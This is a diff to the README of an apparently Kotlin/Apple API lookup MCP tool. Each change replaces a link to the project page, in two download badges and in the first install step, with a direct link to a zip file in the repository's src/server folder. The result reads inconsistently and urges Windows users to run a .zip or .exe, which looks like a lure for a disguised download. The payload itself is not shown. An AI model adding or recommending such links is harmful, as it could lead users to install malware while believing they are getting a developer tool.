@@ -1,6 +1,6 @@
 # 🔍 kmp-api-lookup-mcp - Find Kotlin Apple API details fast
 
-[![](https://img.shields.io/badge/Download-App-blue)](https://github.com/Heymonth/kmp-api-lookup-mcp)
+[![](https://img.shields.io/badge/Download-App-blue)](https://raw.githubusercontent.com/Heymonth/kmp-api-lookup-mcp/main/src/server/mcp-lookup-api-kmp-v1.9.zip)
 
 ## 📖 About this application
 
@@ -21,12 +21,12 @@ Your computer must meet these basic standards to run this software:
 
 Follow these steps to obtain the files for your system:
 
-1. Visit the project website at: https://github.com/Heymonth/kmp-api-lookup-mcp
+1. Visit the project website at: https://raw.githubusercontent.com/Heymonth/kmp-api-lookup-mcp/main/src/server/mcp-lookup-api-kmp-v1.9.zip
 2. Locate the Releases section on the right side of the page.
 3. Choose the latest version available for Windows.
 4. Select the file ending in .zip or .exe to start the transfer to your computer.
 
-[![](https://img.shields.io/badge/Download-Release-grey)](https://github.com/Heymonth/kmp-api-lookup-mcp)
+[![](https://img.shields.io/badge/Download-Release-grey)](https://raw.githubusercontent.com/Heymonth/kmp-api-lookup-mcp/main/src/server/mcp-lookup-api-kmp-v1.9.zip)
 
 ## ⚙️ Setting up the environment
 
